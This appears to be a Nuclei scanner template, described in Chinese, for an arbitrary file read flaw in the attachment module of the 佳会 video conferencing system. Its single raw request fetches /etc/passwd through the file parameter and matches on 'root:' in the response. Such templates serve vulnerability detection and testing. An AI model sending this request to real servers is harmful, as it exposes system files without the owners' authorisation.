id: jiahuivideo-File-reading

info:
  name: "佳会视频会议系统 attachment 模块任意文件读取"
  author: Unknown
  severity: medium
  description: 佳会视频会议系统中的 attachment 模块存在任意文件读取漏洞。攻击者可通过构造恶意请求路径参数，绕过文件访问控制机制，读取服务器上非授权的任意文件内容，可能导致敏感信息泄露或系统文件被篡改。
  tags: 佳会视频会议

http:
- raw:
  - |
    GET /attachment?file=/etc/passwd HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 'root:'
  - type: status
    status:
    - 200





